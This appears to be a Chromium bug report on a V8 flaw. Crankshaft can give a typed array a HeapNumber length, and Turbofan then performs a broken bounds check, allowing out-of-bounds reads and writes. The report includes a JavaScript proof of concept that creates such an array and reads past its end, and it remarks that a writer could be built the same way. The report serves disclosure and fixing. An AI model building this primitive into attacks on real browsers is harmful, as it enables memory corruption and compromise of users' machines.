<b>VULNERABILITY DETAILS</b>
As of [1], Turbofan expects a JSTypedArray's length field to always contain a Smi, but Crankshaft can be tricked into storing the length as a HeapNumber. Turbofan-optimized code will then read the upper half of this HeapNumber's pointer as an int32 and perform a bogus bounds check against it. This allows OOB r/w accesses.

Since most of the system agrees with Turbofan that those length values should be Smis, the appropriate fix is to ensure that Crankshaft is aligned with this assumption.

[1] https://codereview.chromium.org/2320473003/diff/80001/src/compiler/access-builder.cc

<b>VERSION</b>
Chrome Version: current ToT, M55-Dev
Operating System: all (only x64)

<b>REPRODUCTION CASE</b>

function c4(w, h) {
  var size = w * h;
  if (size < 0) size = 0;
  return new Uint32Array(size);
}

for (var i = 0; i < 3; i++) {
  // Computing -0 as the result makes the "size = w * h" multiplication IC
  // go into double mode.
  c4(0, -1);
}
// Optimize Uint32ConstructFromLength.
for (var i = 0; i < 1000; i++) c4(2, 2);

// This array will have a HeapNumber as its length:
var bomb = c4(2, 2);

// By the same principle, a writer could be constructed :-)
function reader(o, i) {
  // Dummy try-catch, so that TurboFan is used to optimize this.
  try {} catch(e) {}
  return o[i];
}
// Optimize reader!
for (var i = 0; i < 3; i++) reader(bomb, 0);
%OptimizeFunctionOnNextCall(reader);
reader(bomb, 0);

for (var i = bomb.length; i < 1000; i++) {
  // All these *should* be undefined...
  print(i + " : " + reader(bomb, i));
}

